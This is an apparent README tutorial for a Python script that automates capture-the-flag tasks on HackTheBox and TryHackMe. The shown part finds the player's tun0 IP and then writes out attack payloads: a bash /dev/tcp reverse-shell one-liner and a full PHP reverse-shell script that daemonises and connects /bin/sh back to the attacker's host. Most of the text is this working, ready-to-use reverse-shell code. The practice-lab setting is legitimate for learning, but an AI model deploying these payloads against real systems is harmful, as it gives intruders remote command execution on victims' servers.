# HOW TO CREATE YOUR OWN AUTOMATION SCRIPT 

## Tamil language

If you can understand Tamil language then watch this video 👇 <br>
Tutorial Video link: https://youtu.be/C9EAKWY37cQ <br>
I explained every step clearly here <br>

## English language
#### AUTOMATE CTFS
Here we're going to automate some tasks that we do when playing CTFs (Specially for HackTheBox and TryHackMe)
<br>
### Our plan
```bash
1)  Finding the tun0 IP of our machine
2)  Creating bash and php-rev-shell payloads for that IP
3)  Checking the Machine IP is in live or not
4)  If it's live then opening it in a web browser
5)  Running port scan
6)  Directory Brute-forcing
7)  Opening required terminals
8)  Starting a python server to send payload files
9)  Starting a netcat to get shell
10) Opening Metasploit
11) Save-time.txt
```
So this is our plan, we're going to automate these tasks. Let's go step by step
<br>
### Importing required modules
```python
from os import system as cmd
from time import sleep
import pyautogui as py
import subprocess
import re
import webbrowser 
```
<br>
Now we need the machine IP to use it in future tasks, so let's assign it here

```python
MACHINE_IP = "10.10.10.230"
```
<br>

#### Finding the tun0 IP of our machine
```python
with open('ip.txt','w') as f:
        ip = subprocess.run(['ip', 'a'],stdout=f,text=True)
```

Here we're running ```ip a``` command and redirecting the ```stdout```  to `f` . So, We can save the result in *"ip.txt"* file
<br>

#### Seperating tun0 IP from *"ip.txt"*
```python
txt_file = open('ip.txt','r')
IP = txt_file.read()
pattern = re.compile("[10]+\.+[10]+\.+\d\d+\.+\w{2,3}")
search_tun0 = pattern.findall(IP)
tun0_IP = search_tun0[0]
print("TUN0 IP FOUND:",tun0_IP)
```
Here we opened *"ip.txt"* file and searching a specific pattern in it

#### generating bash revshell and php-rev-shell payloads
##### bash rev shell
```python
port = "9001"
rev_shell = "bash -c 'bash -i >& /dev/tcp/"+tun0_IP+"/"+port+" 0>&1\'"
shell_txt = open('shell.sh','w')
shell_txt.write(rev_shell)
shell_txt.close()
cmd('echo " " >> shell.sh') # to avoid that '#' char in last part of code
```
creating *"shell.sh"* file and writing bash-rev-shell payload in it

##### php rev shell
```python
rev_txt = open('php-rev-shell.php','w')
```
creating *"php-rev-shell.php"* file and writing php-rev-shell payload in it

```python
rev_txt.write('''<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = "'''+ tun0_IP + '''\";
$port = 1234;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();
        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }
        if ($pid) {
                exit(0);  // Parent exits
        }
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }
        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}
?>
''')
rev_txt.close()
print("\nPHP and BASH Rev Shell Files Created SUCESSFULLY")
```
